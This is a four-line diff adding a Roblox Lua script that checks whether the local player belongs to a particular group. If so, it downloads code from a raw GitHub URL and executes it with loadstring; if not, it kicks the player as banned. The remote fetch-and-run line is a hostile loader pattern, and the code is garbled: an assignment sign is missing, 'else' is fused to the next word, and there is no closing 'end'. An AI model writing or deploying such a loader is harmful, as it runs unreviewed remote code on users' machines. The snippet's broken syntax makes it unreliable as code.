@@ -1,0 +1,4 @@
+local plr game:GetService("Players").LocalPlayer
+if plr:IsInGroup("9880979") then
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Kukinekk/hehe/main/zuroluv"))()
+   elseplr:Kick("User BANNED")
